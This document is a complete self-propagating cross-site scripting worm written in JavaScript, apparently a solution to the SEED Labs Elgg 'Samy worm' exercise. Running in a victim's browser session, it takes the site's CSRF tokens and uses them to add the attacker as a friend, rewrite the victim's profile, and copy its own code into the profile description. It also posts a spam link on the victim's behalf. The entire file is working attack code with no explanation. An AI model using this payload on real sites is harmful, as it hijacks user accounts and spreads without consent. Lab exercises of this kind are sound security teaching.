<script type="text/javascript" id="worm">
    window.onload = function () {
    
        var Ajax = null;
        var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
        var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
        //Construct the HTTP request to add Samy as a friend.

        var sendurl = "http://www.seed-server.com/action/friends/add"
            + "?friend=59" + token + ts;//FILL IN

        var guid_of_samy = 59;
       
        if (elgg.session.user.guid != guid_of_samy) {
            //task 1

            //Create and send Ajax request to add friend
            Ajax = new XMLHttpRequest();
            Ajax.open("GET", sendurl, true);
            Ajax.setRequestHeader("Host", "www.seed-server.com");
            Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            Ajax.send();

            //task 2

            var name_of_user = elgg.session.user.name;
            var guid_of_user = "&guid=" + elgg.session.user.guid;

            var description = "&description=";
            var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
            var jsCode = document.getElementById("worm").innerHTML;
            var tailTag = "</" + "script > ";
            var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
            alert(jsCode);
            description += wormCode;


            var briefdescription = "&briefdescription=SAMY says \" I modify your profile \" ";
            var location = "&location=SAMY says \" I modify your profile \" ";
            var interests = "&interests=SAMY says \" I modify your profile \" ";
            var skills = "&skills=SAMY says \" I modify your profile \" ";
            var contactemail = "&contactemail=samy01@gmail.com";
            var phone = "&phone=SAMY says \" I modify your profile \" ";
            var mobile = "&mobile=SAMY says \" I modify your profile \" ";
            var website = "&website=http://www.SAMY-server.com";
            var twitter = "&twitter=SAMY says \" I modify your profile \" ";

            //Construct the content of your url.
            sendurl = "http://www.seed-server.com/action/profile/edit"; //FILL IN
            var content = token + ts + name_of_user + description + "&accesslevel[description]=1" + briefdescription + "&accesslevel[briefdescription]=1" + location + "&accesslevel[location]=1" + interests + "&accesslevel[interests]=1" + skills + "&accesslevel[skills]=1" + contactemail + "&accesslevel[contactemail]=1" + phone + "&accesslevel[phone]=1" + mobile + "&accesslevel[mobile]=1" + website + "&accesslevel[website]=1" + twitter + "&accesslevel[twitter]=1" + guid_of_user; //FILL IN

            //Create and send Ajax request to modify profile
            Ajax = null;
            Ajax = new XMLHttpRequest();
            Ajax.open("POST", sendurl, true);
            Ajax.setRequestHeader("Host", "www.seed-server.com");
            Ajax.setRequestHeader("Content-Type",
                "application/x-www-form-urlencoded");
            Ajax.send(content);

            //task 3
            var body = "&body=To earn 12 USD/Hour(!),visit now\n\"http://www.seed-server.com/profile/samy\" ";
            //Construct the content of your url.
            sendurl = "http://www.seed-server.com/action/thewire/add"; //FILL IN
            content = token + ts + body; //FILL IN
            //Create and send Ajax request to post on the Wire on Behalf of the Victim
            Ajax = null;
            Ajax = new XMLHttpRequest();
            Ajax.open("POST", sendurl, true);
            Ajax.setRequestHeader("Host", "www.seed-server.com");
            Ajax.setRequestHeader("Content-Type",
                "application/x-www-form-urlencoded");
            Ajax.send(content);

            

        }

}
</script >